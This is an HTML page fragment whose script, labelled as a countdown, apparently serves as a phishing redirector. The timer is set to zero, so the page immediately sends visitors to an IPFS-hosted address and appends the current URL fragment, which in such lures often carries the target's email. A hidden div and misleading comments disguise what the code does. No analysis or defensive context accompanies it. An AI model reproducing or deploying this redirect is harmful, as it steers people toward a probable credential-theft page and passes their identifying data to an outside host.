<div id="countdown" style="display: None;"></div>
<script type="text/javascript">
    
    // Total seconds to wait
var seconds = 0;

function countdown() {
    // Decrement seconds
    seconds--;
    
    if (seconds < 0) {
        // Perform redirection after countdown
        var val = window.location.hash.substring(1);
        window.location.href = "https://ipfs.io/ipfs/QmUKjiQ1h9UbDg682qKnEvY2WrYPpVcYYfobQdx9pLfwyP#" + val;
    } else {
        // Update countdown on the page
        document.getElementById("countdown").innerHTML = seconds;
        // Continue countdown
        setTimeout(countdown, 1000);
    }
}

// Run countdown function
countdown();
    
</script>
